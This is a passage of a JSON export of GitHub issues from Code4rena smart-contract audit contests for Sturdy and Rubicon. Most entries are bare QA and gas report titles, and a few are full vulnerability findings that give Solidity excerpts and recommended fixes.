"https://github.com/code-423n4/2022-05-sturdy-findings/issues/146", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-05-sturdy-findings", "body": "QA Report"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-05-sturdy-findings/issues/145", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-05-sturdy-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-05-sturdy-findings/issues/144", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-05-sturdy-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-05-sturdy-findings/issues/143", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-05-sturdy-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-05-sturdy-findings/issues/142", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-05-sturdy-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-05-sturdy-findings/issues/138", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-05-sturdy-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-05-sturdy-findings/issues/135", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-05-sturdy-findings", "body": "QA Report"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-05-sturdy-findings/issues/134", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-05-sturdy-findings", "body": "QA Report"}, {"title": "hard-coded slippage may freeze user funds during market turbulence", "html_url": "https://github.com/code-423n4/2022-05-sturdy-findings/issues/133", "labels": ["bug", "3 (High Risk)", "sponsor confirmed"], "target": "2022-05-sturdy-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-05-sturdy/blob/main/smart-contracts/GeneralVault.sol#L125 https://github.com/code-423n4/2022-05-sturdy/blob/main/smart-contracts/LidoVault.sol#L130-L137   # Vulnerability details  ## Impact [GeneralVault.sol#L125](https://github.com/code-423n4/2022-05-sturdy/blob/main/smart-contracts/GeneralVault.sol#L125) GeneralVault set a hardcoded slippage control of 99%. However, the underlying yield tokens price may go down. If Luna/UST things happen again, users' funds may get locked.  [LidoVault.sol#L130-L137](https://github.com/code-423n4/2022-05-sturdy/blob/main/smart-contracts/LidoVault.sol#L130-L137) Moreover, the withdrawal of the lidoVault takes a swap from the curve pool. 1 stEth worth 0.98 ETH at the time of writing. The vault can not withdraw at the current market.  Given that users' funds would be locked in the lidoVault, I consider this a high-risk issue.  ## Proof of Concept [1 stEth  = 0.98 Eth](https://twitter.com/hasufl/status/1524717773959700481/photo/1)  [LidoVault.sol#L130-L137](https://github.com/code-423n4/2022-05-sturdy/blob/main/smart-contracts/LidoVault.sol#L130-L137)   ## Tools Used  ## Recommended Mitigation Steps  There are different ways to set the slippage.   The first one is to let users determine the maximum slippage they're willing to take. The protocol front-end should set the recommended value for them. ```solidity   function withdrawCollateral(     address _asset,     uint256 _amount,     address _to,     uint256 _minReceiveAmount   ) external virtual {       // ...     require(withdrawAmount >= _minReceiveAmount, Errors.VT_WITHDRAW_AMOUNT_MISMATCH);   } ```   The second one is have a slippage control parameters that's set by the operator.  ```solidity     // Exchange stETH -> ETH via Curve     uint256 receivedETHAmount = CurveswapAdapter.swapExactTokensForTokens(       _addressesProvider,       _addressesProvider.getAddress('STETH_ETH_POOL'),       LIDO,       ETH,       yieldStETH,       maxSlippage     ); ```  ```solidity     function setMaxSlippage(uint256 _slippage) external onlyOperator {         maxSlippage = _slippage;          //@audit This action usually emit an event.         emit SetMaxSlippage(msg.sender, slippage);     } ```  These are two common ways to deal with this issue. I prefer the first one. The market may corrupt really fast before the operator takes action. It's nothing fun watching the number go down while having no option.  "}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-05-sturdy-findings/issues/132", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-05-sturdy-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-05-sturdy-findings/issues/131", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-05-sturdy-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-05-sturdy-findings/issues/130", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-05-sturdy-findings", "body": "QA Report"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-05-sturdy-findings/issues/128", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-05-sturdy-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-05-sturdy-findings/issues/127", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-05-sturdy-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-05-sturdy-findings/issues/126", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-05-sturdy-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-05-sturdy-findings/issues/125", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-05-sturdy-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-05-sturdy-findings/issues/124", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-05-sturdy-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-05-sturdy-findings/issues/122", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-05-sturdy-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-05-sturdy-findings/issues/121", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-05-sturdy-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-05-sturdy-findings/issues/120", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-05-sturdy-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-05-sturdy-findings/issues/119", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-05-sturdy-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-05-sturdy-findings/issues/118", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-05-sturdy-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-05-sturdy-findings/issues/117", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-05-sturdy-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-05-sturdy-findings/issues/116", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-05-sturdy-findings", "body": "QA Report"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-05-sturdy-findings/issues/114", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-05-sturdy-findings", "body": "QA Report"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-05-sturdy-findings/issues/111", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-05-sturdy-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-05-sturdy-findings/issues/110", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-05-sturdy-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-05-sturdy-findings/issues/107", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-05-sturdy-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-05-sturdy-findings/issues/104", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-05-sturdy-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-05-sturdy-findings/issues/103", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-05-sturdy-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-05-sturdy-findings/issues/102", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-05-sturdy-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-05-sturdy-findings/issues/99", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-05-sturdy-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-05-sturdy-findings/issues/98", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-05-sturdy-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-05-sturdy-findings/issues/94", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-05-sturdy-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-05-sturdy-findings/issues/92", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-05-sturdy-findings", "body": "QA Report"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-05-sturdy-findings/issues/89", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-05-sturdy-findings", "body": "QA Report"}, {"title": "Withdrawing ETH collateral with max uint256 amount value reverts transaction", "html_url": "https://github.com/code-423n4/2022-05-sturdy-findings/issues/85", "labels": ["bug", "2 (Med Risk)", "sponsor confirmed"], "target": "2022-05-sturdy-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-05-sturdy/blob/78f51a7a74ebe8adfd055bdbaedfddc05632566f/smart-contracts/GeneralVault.sol#L121-L124   # Vulnerability details  ## Impact  Withdrawing ETH collateral via the `withdrawCollateral` function using `type(uint256).max` for the `_amount` parameter reverts the transaction due to `_asset` being the zero-address and `IERC20Detailed(_asset).decimals()` not working for native ETH.  ## Proof of Concept  [GeneralVault.sol#L121-L124](https://github.com/code-423n4/2022-05-sturdy/blob/78f51a7a74ebe8adfd055bdbaedfddc05632566f/smart-contracts/GeneralVault.sol#L121-L124)  ```solidity if (_amount == type(uint256).max) {     uint256 decimal = IERC20Detailed(_asset).decimals(); // @audit-info does not work for native ETH. Transaction reverts     _amount = _amountToWithdraw.mul(this.pricePerShare()).div(10**decimal); } ```  ## Tools Used  Manual review  ## Recommended mitigation steps  Check `_asset` and use hard coded decimal value (`18`) for native ETH  "}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-05-sturdy-findings/issues/80", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-05-sturdy-findings", "body": "QA Report"}, {"title": "ConvexCurveLPVault's _transferYield can become stuck with zero reward transfer", "html_url": "https://github.com/code-423n4/2022-05-sturdy-findings/issues/79", "labels": ["bug", "2 (Med Risk)", "sponsor confirmed"], "target": "2022-05-sturdy-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-05-sturdy/blob/78f51a7a74ebe8adfd055bdbaedfddc05632566f/smart-contracts/ConvexCurveLPVault.sol#L74-L82   # Vulnerability details  Now there are no checks for the amounts to be transferred via _transferYield and _processTreasury. As reward token list is external and an arbitrary token can end up there, in the case when such token doesn't allow for zero amount transfers, the reward retrieval can become unavailable.  I.e. processYield() can be fully blocked for even an extended period, with some low probability, which cannot be controlled otherwise as pool reward token list is external.  Setting the severity to medium as reward gathering is a base functionality for the system and its availability is affected.  ## Proof of Concept  _transferYield proceeds with sending the amounts to treasury and yieldManager without checking:  https://github.com/code-423n4/2022-05-sturdy/blob/78f51a7a74ebe8adfd055bdbaedfddc05632566f/smart-contracts/ConvexCurveLPVault.sol#L74-L82  ```solidity     // transfer to treasury     if (_vaultFee > 0) {       uint256 treasuryAmount = _processTreasury(_asset, yieldAmount);       yieldAmount = yieldAmount.sub(treasuryAmount);     }      // transfer to yieldManager     address yieldManager = _addressesProvider.getAddress('YIELD_MANAGER');     TransferHelper.safeTransfer(_asset, yieldManager, yieldAmount); ```  https://github.com/code-423n4/2022-05-sturdy/blob/78f51a7a74ebe8adfd055bdbaedfddc05632566f/smart-contracts/ConvexCurveLPVault.sol#L205-L209  ```solidity   function _processTreasury(address _asset, uint256 _yieldAmount) internal returns (uint256) {     uint256 treasuryAmount = _yieldAmount.percentMul(_vaultFee);     IERC20(_asset).safeTransfer(_treasuryAddress, treasuryAmount);     return treasuryAmount;   } ```  The incentive token can be arbitrary. Some ERC20 do not allow zero amounts to be sent:  https://github.com/d-xo/weird-erc20#revert-on-zero-value-transfers  In a situation of such a token added to reward list and zero incentive amount earned the whole processYield call will revert, making reward gathering unavailable until either such token be removed from pool's reward token list or some non-zero reward amount be earned. Both are external processes and aren\u2019t controllable.  ## Recommended Mitigation Steps  Consider running the transfers in _transferYield only when yieldAmount is positive:  ```solidity + if (yieldAmount > 0) {      // transfer to treasury      if (_vaultFee > 0) {        uint256 treasuryAmount = _processTreasury(_asset, yieldAmount);        yieldAmount = yieldAmount.sub(treasuryAmount);      }       // transfer to yieldManager      address yieldManager = _addressesProvider.getAddress('YIELD_MANAGER');      TransferHelper.safeTransfer(_asset, yieldManager, yieldAmount); +  } ```  "}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-05-sturdy-findings/issues/78", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-05-sturdy-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-05-sturdy-findings/issues/77", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-05-sturdy-findings", "body": "QA Report"}, {"title": "`processYield()` and `distributeYield()` may run out of gas and revert due to long list of extra rewards/yields", "html_url": "https://github.com/code-423n4/2022-05-sturdy-findings/issues/70", "labels": ["bug", "2 (Med Risk)", "sponsor confirmed"], "target": "2022-05-sturdy-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-05-sturdy/blob/78f51a7a74ebe8adfd055bdbaedfddc05632566f/smart-contracts/ConvexCurveLPVault.sol#L105-L110 https://github.com/code-423n4/2022-05-sturdy/blob/78f51a7a74ebe8adfd055bdbaedfddc05632566f/smart-contracts/YieldManager.sol#L129-L136   # Vulnerability details  ## Impact Yields will not be able to be distributed to lenders because attempts to do so will revert  ## Proof of Concept The `processYield()` function loops overall of the extra rewards and transfers them ```solidity File: smart-contracts/ConvexCurveLPVault.sol   #1  105       uint256 extraRewardsLength = IConvexBaseRewardPool(baseRewardPool).extraRewardsLength(); 106       for (uint256 i = 0; i < extraRewardsLength; i++) { 107         address _extraReward = IConvexBaseRewardPool(baseRewardPool).extraRewards(i); 108         address _rewardToken = IRewards(_extraReward).rewardToken(); 109         _transferYield(_rewardToken); 110       } ``` https://github.com/code-423n4/2022-05-sturdy/blob/78f51a7a74ebe8adfd055bdbaedfddc05632566f/smart-contracts/ConvexCurveLPVault.sol#L105-L110  There is no guarantee that the tokens involved will be efficient in their use of gas, and there are no upper bounds on the number of extra rewards:  ```solidity     function extraRewardsLength() external view returns (uint256) {         return extraRewards.length;     }       function addExtraReward(address _reward) external returns(bool){         require(msg.sender == rewardManager, \"!authorized\");         require(_reward != address(0),\"!reward setting\");           extraRewards.push(_reward);         return true;     } ``` https://github.com/convex-eth/platform/blob/main/contracts/contracts/BaseRewardPool.sol#L105-L115  Even if not every extra reward token has a balance, an attacker can sprinkle each one with dust, forcing a transfer by this function  `_getAssetYields()` has a similar issue: ```solidity File: smart-contracts/YieldManager.sol   #X  129       AssetYield[] memory assetYields = _getAssetYields(exchangedAmount); 130       for (uint256 i = 0; i < assetYields.length; i++) { 131         if (assetYields[i].amount > 0) { 132           uint256 _amount = _convertToStableCoin(assetYields[i].asset, assetYields[i].amount); 133           // 3. deposit Yield to pool for suppliers 134           _depositYield(assetYields[i].asset, _amount); 135         } 136       } ``` https://github.com/code-423n4/2022-05-sturdy/blob/78f51a7a74ebe8adfd055bdbaedfddc05632566f/smart-contracts/YieldManager.sol#L129-L136  ## Tools Used Code inspection  ## Recommended Mitigation Steps Include an offset and length as is done in `YieldManager.distributeYield()`   "}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-05-sturdy-findings/issues/69", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-05-sturdy-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-05-sturdy-findings/issues/68", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-05-sturdy-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-05-sturdy-findings/issues/67", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-05-sturdy-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-05-sturdy-findings/issues/66", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-05-sturdy-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-05-sturdy-findings/issues/64", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-05-sturdy-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-05-sturdy-findings/issues/63", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-05-sturdy-findings", "body": "QA Report"}, {"title": "Possible lost msg.value", "html_url": "https://github.com/code-423n4/2022-05-sturdy-findings/issues/62", "labels": ["bug", "2 (Med Risk)", "sponsor confirmed"], "target": "2022-05-sturdy-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-05-sturdy/blob/78f51a7a74ebe8adfd055bdbaedfddc05632566f/smart-contracts/GeneralVault.sol#L75-L89 https://github.com/code-423n4/2022-05-sturdy/blob/78f51a7a74ebe8adfd055bdbaedfddc05632566f/smart-contracts/LidoVault.sol#L79-L104 https://github.com/code-423n4/2022-05-sturdy/blob/78f51a7a74ebe8adfd055bdbaedfddc05632566f/smart-contracts/ConvexCurveLPVault.sol#L131-L149   # Vulnerability details  ## Impact Possible lost value in `depositCollateral` function call  ## Proof of Concept In call `depositCollateral` can will send value and the asset can be an ERC20(!= address(0)), if `LidoVault` and `ConvexCurveLPVault` contract receive this call the fouds will lost Also in **LidoVault, L88**, if send as asset ETH(== address(0)) and send more value than `_amount`(msg.value > _amount), the exedent will lost  ## Recommended Mitigation Steps  In **GeneralVault**, `depositCollateral` function:  - Check if the `msg.value` is zero when the `_asset` is ERC20(!= address(0))  - Check if the `msg.value` is equeal to `_amount` when the `_asset` ETH(== address(0))  ```solidity function depositCollateral(address _asset, uint256 _amount) external payable virtual {   if (_asset != address(0)) { // asset = ERC20     require(msg.value == 0, <AN ERROR FROM Errors LIBRARY>);   } else { // asset = ETH     require(msg.value == _amount, <AN ERROR FROM Errors LIBRARY>);   }    // Deposit asset to vault and receive stAsset   // Ex: if user deposit 100ETH, this will deposit 100ETH to Lido and receive 100stETH TODO No Lido   (address _stAsset, uint256 _stAssetAmount) = _depositToYieldPool(_asset, _amount);    // Deposit stAsset to lendingPool, then user will get aToken of stAsset   ILendingPool(_addressesProvider.getLendingPool()).deposit(     _stAsset,     _stAssetAmount,     msg.sender,     0   );    emit DepositCollateral(_asset, msg.sender, _amount); } ``` Also can remove the `require(msg.value > 0, Errors.VT_COLLATERAL_DEPOSIT_REQUIRE_ETH);` in **LidoVault, L88**   "}, {"title": "Title: Yield can be unfairly divided because of MEV/Just-in-time stablecoin deposits", "html_url": "https://github.com/code-423n4/2022-05-sturdy-findings/issues/61", "labels": ["bug", "2 (Med Risk)", "sponsor acknowledged"], "target": "2022-05-sturdy-findings", "body": "Title: Yield can be unfairly divided because of MEV/Just-in-time stablecoin deposits"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-05-sturdy-findings/issues/58", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-05-sturdy-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-05-sturdy-findings/issues/57", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-05-sturdy-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-05-sturdy-findings/issues/55", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-05-sturdy-findings", "body": "QA Report"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-05-sturdy-findings/issues/53", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-05-sturdy-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-05-sturdy-findings/issues/51", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-05-sturdy-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-05-sturdy-findings/issues/50", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-05-sturdy-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-05-sturdy-findings/issues/49", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-05-sturdy-findings", "body": "QA Report"}, {"title": "`UNISWAP_FEE` is hardcoded which will lead to significant losses compared to optimal routing", "html_url": "https://github.com/code-423n4/2022-05-sturdy-findings/issues/48", "labels": ["bug", "duplicate", "2 (Med Risk)", "sponsor confirmed"], "target": "2022-05-sturdy-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-05-sturdy/blob/78f51a7a74ebe8adfd055bdbaedfddc05632566f/smart-contracts/YieldManager.sol#L48 https://github.com/code-423n4/2022-05-sturdy/blob/78f51a7a74ebe8adfd055bdbaedfddc05632566f/smart-contracts/YieldManager.sol#L184   # Vulnerability details  ## Impact In [`YieldManager`](https://github.com/code-423n4/2022-05-sturdy/blob/78f51a7a74ebe8adfd055bdbaedfddc05632566f/smart-contracts/YieldManager.sol#L48), `UNISWAP_FEE` is hardcoded, which reduce significantly the possibilities and will lead to non optimal routes. In particular, all swaps using ETH path will use the wrong pool as it will use the ETH / USDC 1% one due to this [line](https://github.com/sturdyfi/code4rena-may-2022/blob/d53f4f5f0b7b33a66e0081294be6117f6d6e17b4/contracts/protocol/libraries/swap/UniswapAdapter.sol#L50).\u2028   ## Proof of Concept For example for CRV / USDC, the optimal route is currently CRV -> ETH and ETH -> USDC, and the pool ETH / USDC with 1% fees is tiny compared to the ones with 0.3 or 0.1%. Therefore using the current implementation would create a significant loss of revenue.   ## Recommended Mitigation Steps Basic mitigation would be to hardcode in advance the best Uniswap paths in a mapping like it\u2019s done for Curve pools, then pass this path already computed to the swapping library. This would allow for complex route and save gas costs as you would avoid computing them in `swapExactTokensForTokens`.  Then, speaking from experience, as `distributeYield` is `onlyAdmin`, you may want to add the possibility to do the swaps through an efficient aggregator like 1Inch or Paraswap, it will be way more optimal.  "}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-05-sturdy-findings/issues/44", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-05-sturdy-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-05-sturdy-findings/issues/43", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-05-sturdy-findings", "body": "QA Report"}, {"title": "Gas Optimization", "html_url": "https://github.com/code-423n4/2022-05-sturdy-findings/issues/42", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-05-sturdy-findings", "body": "Gas Optimization"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-05-sturdy-findings/issues/41", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-05-sturdy-findings", "body": "QA Report"}, {"title": "Gas Optimization", "html_url": "https://github.com/code-423n4/2022-05-sturdy-findings/issues/40", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-05-sturdy-findings", "body": "Gas Optimization"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-05-sturdy-findings/issues/39", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-05-sturdy-findings", "body": "QA Report"}, {"title": "Gas Optimization", "html_url": "https://github.com/code-423n4/2022-05-sturdy-findings/issues/38", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-05-sturdy-findings", "body": "Gas Optimization"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-05-sturdy-findings/issues/33", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-05-sturdy-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-05-sturdy-findings/issues/31", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-05-sturdy-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-05-sturdy-findings/issues/29", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-05-sturdy-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-05-sturdy-findings/issues/28", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-05-sturdy-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-05-sturdy-findings/issues/24", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-05-sturdy-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-05-sturdy-findings/issues/23", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-05-sturdy-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-05-sturdy-findings/issues/22", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-05-sturdy-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-05-sturdy-findings/issues/21", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-05-sturdy-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-05-sturdy-findings/issues/20", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-05-sturdy-findings", "body": "QA Report"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-05-sturdy-findings/issues/18", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-05-sturdy-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-05-sturdy-findings/issues/17", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-05-sturdy-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-05-sturdy-findings/issues/12", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-05-sturdy-findings", "body": "QA Report"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-05-sturdy-findings/issues/9", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-05-sturdy-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-05-sturdy-findings/issues/8", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-05-sturdy-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-05-sturdy-findings/issues/2", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-05-sturdy-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-05-sturdy-findings/issues/1", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-05-sturdy-findings", "body": "Gas Optimizations"}, {"title": "Agreements & Disclosures", "html_url": "https://github.com/code-423n4/2022-05-rubicon-findings/issues/455", "labels": [], "target": "2022-05-rubicon-findings", "body": "Agreements & Disclosures"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-05-rubicon-findings/issues/452", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-05-rubicon-findings", "body": "Gas Optimizations"}, {"title": "Early funds withdrawers can get bonus in multiples of vested bonus tokens (e.g. 2-times, 3-times, etc.)", "html_url": "https://github.com/code-423n4/2022-05-rubicon-findings/issues/450", "labels": ["bug", "2 (Med Risk)", "sponsor confirmed"], "target": "2022-05-rubicon-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-05-rubicon/blob/8c312a63a91193c6a192a9aab44ff980fbfd7741/contracts/rubiconPools/BathToken.sol#L270 https://github.com/code-423n4/2022-05-rubicon/blob/8c312a63a91193c6a192a9aab44ff980fbfd7741/contracts/rubiconPools/BathToken.sol#L629 https://github.com/code-423n4/2022-05-rubicon/blob/8c312a63a91193c6a192a9aab44ff980fbfd7741/contracts/peripheral_contracts/BathBuddy.sol#L98-L101   # Vulnerability details   The function setBonusToken allows the same BonusToken to be added more than once to the array bonusTokens.  ```   function setBonusToken(address newBonusERC20) external onlyBathHouse {     bonusTokens.push(newBonusERC20);   } ```  ## Impact If that happens, early withdrawers can get Bonus in multiples of what they actually have right to. Late withdrawers, might not get any Bonus due to shortage.  ## Proof of Concept BathToken.sol, function setBonusToken https://github.com/code-423n4/2022-05-rubicon/blob/8c312a63a91193c6a192a9aab44ff980fbfd7741/contracts/rubiconPools/BathToken.sol#L270-L272 1. function setBonusToken allows the same BonusToken to be added more than once to the array.  BathToken.sol, function distributeBonusTokenRewards https://github.com/code-423n4/2022-05-rubicon/blob/8c312a63a91193c6a192a9aab44ff980fbfd7741/contracts/rubiconPools/BathToken.sol#L629 2. a. As and when distributeBonusTokenRewards is triggered during a withdraw call, the same bonusToken will be released more than once.  BathBuddy.sol, function release https://github.com/code-423n4/2022-05-rubicon/blob/8c312a63a91193c6a192a9aab44ff980fbfd7741/contracts/peripheral_contracts/BathBuddy.sol#L98-L101 2. b. The release function is called.  ## Tools Used Manual review  ## Recommended Mitigation Steps   Add the required validations to avoid duplicate additions of bonus tokens.  ```   function setBonusToken(address newBonusERC20) external onlyBathHouse {     require(newBonusERC20 != address(0), \"invalid_addr\");     if (bonusTokens.length > 0) {       for (uint256 index = 0; index < bonusTokens.length; index++) {         require (token != newBonusERC20, \"token already exists\")       }     }     